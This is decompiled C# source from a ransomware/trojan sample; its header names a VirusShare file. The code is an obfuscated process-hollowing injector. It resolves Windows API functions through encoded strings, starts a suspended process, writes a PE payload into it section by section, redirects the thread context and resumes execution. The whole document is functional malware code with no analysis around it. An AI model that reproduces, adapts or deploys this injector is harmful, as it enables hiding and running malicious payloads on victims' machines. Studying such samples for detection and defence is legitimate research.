// Decompiled with JetBrains decompiler
// Type: 
// Assembly: ii, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 846E36B7-2CFC-43B3-A135-91C6D46B5F36
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-986a8eeb25f179b162606a52852353d07dcd6cc0c7098f76100102cc2ff7666b.exe

using System;
using System.Runtime.InteropServices;

internal class \uE003
{
  [DllImport("kernel32", EntryPoint = "LoadLibrary")]
  private static extern IntPtr \uE000(string _param0);

  [DllImport("kernel32", EntryPoint = "GetProcAddress")]
  private static extern IntPtr \uE001(IntPtr _param0, string _param1);

  public static void \uE002(string _param0, string _param1, byte[] _param2)
  {
    \uE003.\uE002 forFunctionPointer1 = (\uE003.\uE002) Marshal.GetDelegateForFunctionPointer(\uE003.\uE001(\uE003.\uE000(\uE004.\uE000("\uF896\uF898\uF88F\uF893\uF898\uF891\uF8CE\uF8CF\uF8D3\uF899\uF891\uF891", 63741)), \uE004.\uE000("\uF63C\uF60D\uF61A\uF61E\uF60B\uF61A\uF62F\uF60D\uF610\uF61C\uF61A\uF60C\uF60C\uF63E", 63097)), typeof (\uE003.\uE002));
    \uE003.\uE004 forFunctionPointer2 = (\uE003.\uE004) Marshal.GetDelegateForFunctionPointer(\uE003.\uE001(\uE003.\uE000(\uE004.\uE000("\uF3B9\uF3A3\uF3B3\uF3BB\uF3BB\uF3F9\uF3B3\uF3BB\uF3BB", 62356)), \uE004.\uE000("\uEAB0\uEA8A\uEAAB\uEA90\uEA93\uEA9F\uEA8E\uEAA8\uEA97\uEA9B\uEA89\uEAB1\uEA98\uEAAD\uEA9B\uEA9D\uEA8A\uEA97\uEA91\uEA90", 60002)), typeof (\uE003.\uE004));
    \uE003.\uE005 forFunctionPointer3 = (\uE003.\uE005) Marshal.GetDelegateForFunctionPointer(\uE003.\uE001(\uE003.\uE000(\uE004.\uE000("\uF896\uF898\uF88F\uF893\uF898\uF891\uF8CE\uF8CF\uF8D3\uF899\uF891\uF891", 63741)), \uE004.\uE000("\uE723\uE71C\uE707\uE701\uE700\uE714\uE719\uE734\uE719\uE719\uE71A\uE716\uE730\uE70D", 59220)), typeof (\uE003.\uE005));
    \uE003.\uE003 forFunctionPointer4 = (\uE003.\uE003) Marshal.GetDelegateForFunctionPointer(\uE003.\uE001(\uE003.\uE000(\uE004.\uE000("\uF896\uF898\uF88F\uF893\uF898\uF891\uF8CE\uF8CF\uF8D3\uF899\uF891\uF891", 63741)), \uE004.\uE000("\uF581\uF5A4\uF5BF\uF5A2\uF5B3\uF586\uF5A4\uF5B9\uF5B5\uF5B3\uF5A5\uF5A5\uF59B\uF5B3\uF5BB\uF5B9\uF5A4\uF5AF", 62802)), typeof (\uE003.\uE003));
    \uE003.\uE006 forFunctionPointer5 = (\uE003.\uE006) Marshal.GetDelegateForFunctionPointer(\uE003.\uE001(\uE003.\uE000(\uE004.\uE000("\uF896\uF898\uF88F\uF893\uF898\uF891\uF8CE\uF8CF\uF8D3\uF899\uF891\uF891", 63741)), \uE004.\uE000("\uE2F0\uE2D2\uE2C3\uE2E3\uE2DF\uE2C5\uE2D2\uE2D6\uE2D3\uE2F4\uE2D8\uE2D9\uE2C3\uE2D2\uE2CF\uE2C3", 58003)), typeof (\uE003.\uE006));
    \uE003.\uE007 forFunctionPointer6 = (\uE003.\uE007) Marshal.GetDelegateForFunctionPointer(\uE003.\uE001(\uE003.\uE000(\uE004.\uE000("\uF896\uF898\uF88F\uF893\uF898\uF891\uF8CE\uF8CF\uF8D3\uF899\uF891\uF891", 63741)), \uE004.\uE000("\uF3FD\uF3CB\uF3DA\uF3FA\uF3C6\uF3DC\uF3CB\uF3CF\uF3CA\uF3ED\uF3C1\uF3C0\uF3DA\uF3CB\uF3D6\uF3DA", 62350)), typeof (\uE003.\uE007));
    \uE003.\uE008 forFunctionPointer7 = (\uE003.\uE008) Marshal.GetDelegateForFunctionPointer(\uE003.\uE001(\uE003.\uE000(\uE004.\uE000("\uF896\uF898\uF88F\uF893\uF898\uF891\uF8CE\uF8CF\uF8D3\uF899\uF891\uF891", 63741)), \uE004.\uE000("\uF315\uF322\uF334\uF332\uF32A\uF322\uF313\uF32F\uF335\uF322\uF326\uF323", 62277)), typeof (\uE003.\uE008));
    \uE003.\uE010 obj1 = new \uE003.\uE010();
    \uE003.\uE014 obj2 = new \uE003.\uE014();
    \uE003.\uE017 structure1 = new \uE003.\uE017();
    \uE003.\uE00D lpStartupInfo = new \uE003.\uE00D();
    \uE003.\uE00E lpProcessInformation = new \uE003.\uE00E();
    \uE003.\uE016 lpContext = new \uE003.\uE016();
    lpStartupInfo.\uE000 = (uint) Marshal.SizeOf((object) lpStartupInfo);
    lpContext.\uE000 = 65543U;
    GCHandle gcHandle = GCHandle.Alloc((object) _param2, GCHandleType.Pinned);
    int int32 = gcHandle.AddrOfPinnedObject().ToInt32();
    gcHandle.Free();
    \uE003.\uE010 structure2 = (\uE003.\uE010) Marshal.PtrToStructure((IntPtr) int32, typeof (\uE003.\uE010));
    \uE003.\uE014 structure3 = (\uE003.\uE014) Marshal.PtrToStructure((IntPtr) (int32 + structure2.\uE012), typeof (\uE003.\uE014));
    if (structure3.\uE000 != 17744U || structure2.\uE000 != (ushort) 23117)
      return;
    int num1 = forFunctionPointer1(_param1, _param0, IntPtr.Zero, IntPtr.Zero, false, \uE003.\uE009.\uE009, IntPtr.Zero, (string) null, ref lpStartupInfo, out lpProcessInformation) ? 1 : 0;
    int num2 = forFunctionPointer2(lpProcessInformation.\uE000, (IntPtr) (long) structure3.\uE002.\uE009) ? 1 : 0;
    if (!forFunctionPointer3(lpProcessInformation.\uE000, (IntPtr) (long) structure3.\uE002.\uE009, structure3.\uE002.\uE013, \uE003.\uE00C.\uE000 | \uE003.\uE00C.\uE001, \uE003.\uE00B.\uE002))
      return;
    int num3 = forFunctionPointer4(lpProcessInformation.\uE000, (IntPtr) (long) structure3.\uE002.\uE009, _param2, structure3.\uE002.\uE014, (object) null) ? 1 : 0;
    for (int index1 = 0; index1 <= (int) structure3.\uE001.\uE001 - 1; ++index1)
    {
      structure1 = (\uE003.\uE017) Marshal.PtrToStructure((IntPtr) (int32 + structure2.\uE012 + Marshal.SizeOf((object) structure3) + Marshal.SizeOf((object) structure1) * index1), typeof (\uE003.\uE017));
      byte[] lpBuffer = new byte[(IntPtr) structure1.\uE003];
      for (int index2 = 0; index2 <= (int) structure1.\uE003 - 1; ++index2)
        lpBuffer[index2] = _param2[(long) structure1.\uE004 + (long) index2];
      int num4 = forFunctionPointer4(lpProcessInformation.\uE000, (IntPtr) (long) (structure3.\uE002.\uE009 + structure1.\uE002), lpBuffer, structure1.\uE003, (object) null) ? 1 : 0;
    }
    int num5 = forFunctionPointer5(lpProcessInformation.\uE001, ref lpContext) ? 1 : 0;
    byte[] bytes = BitConverter.GetBytes(structure3.\uE002.\uE009);
    int num6 = forFunctionPointer4(lpProcessInformation.\uE000, (IntPtr) (long) (lpContext.\uE00E + 8U), bytes, (uint) bytes.Length, (object) null) ? 1 : 0;
    lpContext.\uE011 = structure3.\uE002.\uE009 + structure3.\uE002.\uE006;
    int num7 = forFunctionPointer6(lpProcessInformation.\uE001, ref lpContext) ? 1 : 0;
    int num8 = (int) forFunctionPointer7(lpProcessInformation.\uE001);
  }

  private delegate bool \uE002(
    string lpApplicationName,
    string lpCommandLine,
    IntPtr lpProcessAttributes,
    IntPtr lpThreadAttributes,
    bool bInheritHandles,
    \uE003.\uE009 dwCreationFlags,
    IntPtr lpEnvironment,
    string lpCurrentDirectory,
    ref \uE003.\uE00D lpStartupInfo,
    out \uE003.\uE00E lpProcessInformation);

  private delegate bool \uE003(
    IntPtr hProcess,
    IntPtr lpBaseAddress,
    byte[] lpBuffer,
    uint nSize,
    object lpNumberOfBytesWritten);

  private delegate bool \uE004(IntPtr hProcess, IntPtr lpBaseAddress);

  private delegate bool \uE005(
    IntPtr hProcess,
    IntPtr lpAddress,
    uint dwSize,
    \uE003.\uE00C flAllocationType,
    \uE003.\uE00B flProtect);

  private delegate bool \uE006(IntPtr hThread, ref \uE003.\uE016 lpContext);

  private delegate bool \uE007(IntPtr hThread, [In] ref \uE003.\uE016 lpContext);

  private delegate uint \uE008(IntPtr hThread);

  private enum \uE009 : uint
  {
    \uE00C = 1,
    \uE00B = 2,
    \uE009 = 4,
    \uE00D = 8,
    \uE002 = 16, // 0x00000010
    \uE003 = 512, // 0x00000200
    \uE00A = 1024, // 0x00000400
    \uE007 = 2048, // 0x00000800
    \uE008 = 4096, // 0x00001000
    \uE00F = 65536, // 0x00010000
    \uE005 = 262144, // 0x00040000
    \uE00E = 524288, // 0x00080000
    \uE000 = 16777216, // 0x01000000
    \uE006 = 33554432, // 0x02000000
    \uE001 = 67108864, // 0x04000000
    \uE004 = 134217728, // 0x08000000
  }

  private enum \uE00A : uint
  {
    \uE000 = 65536, // 0x00010000
    \uE001 = 65536, // 0x00010000
    \uE002 = 65537, // 0x00010001
    \uE003 = 65538, // 0x00010002
    \uE004 = 65540, // 0x00010004
    \uE008 = 65543, // 0x00010007
    \uE005 = 65544, // 0x00010008
    \uE006 = 65552, // 0x00010010
    \uE007 = 65568, // 0x00010020
    \uE009 = 65599, // 0x0001003F
  }

  private enum \uE00B : uint
  {
    \uE004 = 1,
    \uE005 = 2,
    \uE006 = 4,
    \uE007 = 8,
    \uE000 = 16, // 0x00000010
    \uE001 = 32, // 0x00000020
    \uE002 = 64, // 0x00000040
    \uE003 = 128, // 0x00000080
    \uE008 = 256, // 0x00000100
    \uE009 = 512, // 0x00000200
    \uE00A = 1024, // 0x00000400
  }

  private enum \uE00C : uint
  {
    \uE000 = 4096, // 0x00001000
    \uE001 = 8192, // 0x00002000
    \uE002 = 524288, // 0x00080000
    \uE005 = 1048576, // 0x00100000
    \uE006 = 2097152, // 0x00200000
    \uE004 = 4194304, // 0x00400000
    \uE003 = 536870912, // 0x20000000
  }

  private struct \uE00D
  {
    public uint \uE000;
    public string \uE001;
    public string \uE002;
    public string \uE003;
    public uint \uE004;
    public uint \uE005;
    public uint \uE006;
    public uint \uE007;
    public uint \uE008;
    public uint \uE009;
    public uint \uE00A;
    public uint \uE00B;
    public short \uE00C;
    public short \uE00D;
    public IntPtr \uE00E;
    public IntPtr \uE00F;
    public IntPtr \uE010;
    public IntPtr \uE011;
  }

  private struct \uE00E
  {
    public IntPtr \uE000;
    public IntPtr \uE001;
    public uint \uE002;
    public uint \uE003;
  }

  private struct \uE00F
  {
    public int \uE000;
    public IntPtr \uE001;
    public bool \uE002;
  }

  private struct \uE010
  {
    public ushort \uE000;
    public ushort \uE001;
    public ushort \uE002;
    public ushort \uE003;
    public ushort \uE004;
    public ushort \uE005;
    public ushort \uE006;
    public ushort \uE007;
    public ushort \uE008;
    public ushort \uE009;
    public ushort \uE00A;
    public ushort \uE00B;
    public ushort \uE00C;
    public ushort \uE00D;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public ushort[] \uE00E;
    public ushort \uE00F;
    public ushort \uE010;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
    public ushort[] \uE011;
    public int \uE012;
  }

  private struct \uE011
  {
    public ushort \uE000;
    public ushort \uE001;
    public uint \uE002;
    public uint \uE003;
    public uint \uE004;
    public ushort \uE005;
    public ushort \uE006;
  }

  private struct \uE012
  {
    public uint \uE000;
    public uint \uE001;
  }

  private struct \uE013
  {
    public ushort \uE000;
    public byte \uE001;
    public byte \uE002;
    public uint \uE003;
    public uint \uE004;
    public uint \uE005;
    public uint \uE006;
    public uint \uE007;
    public uint \uE008;
    public uint \uE009;
    public uint \uE00A;
    public uint \uE00B;
    public ushort \uE00C;
    public ushort \uE00D;
    public ushort \uE00E;
    public ushort \uE00F;
    public ushort \uE010;
    public ushort \uE011;
    public uint \uE012;
    public uint \uE013;
    public uint \uE014;
    public uint \uE015;
    public ushort \uE016;
    public ushort \uE017;
    public uint \uE018;
    public uint \uE019;
    public uint \uE01A;
    public uint \uE01B;
    public uint \uE01C;
    public uint \uE01D;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
    public \uE003.\uE012[] \uE01E;
  }

  private struct \uE014
  {
    public uint \uE000;
    public \uE003.\uE011 \uE001;
    public \uE003.\uE013 \uE002;
  }

  private struct \uE015
  {
    public uint \uE000;
    public uint \uE001;
    public uint \uE002;
    public uint \uE003;
    public uint \uE004;
    public uint \uE005;
    public uint \uE006;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
    public byte[] \uE007;
    public uint \uE008;
  }

  private struct \uE016
  {
    public uint \uE000;
    public uint \uE001;
    public uint \uE002;
    public uint \uE003;
    public uint \uE004;
    public uint \uE005;
    public uint \uE006;
    public \uE003.\uE015 \uE007;
    public uint \uE008;
    public uint \uE009;
    public uint \uE00A;
    public uint \uE00B;
    public uint \uE00C;
    public uint \uE00D;
    public uint \uE00E;
    public uint \uE00F;
    public uint \uE010;
    public uint \uE011;
    public uint \uE012;
    public uint \uE013;
    public uint \uE014;
    public uint \uE015;
    public uint \uE016;
    public uint \uE017;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
    public byte[] \uE018;
  }

  private struct \uE017
  {
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
    public byte[] \uE000;
    public uint \uE001;
    public uint \uE002;
    public uint \uE003;
    public uint \uE004;
    public uint \uE005;
    public uint \uE006;
    public ushort \uE007;
    public ushort \uE008;
    public uint \uE009;
  }
}
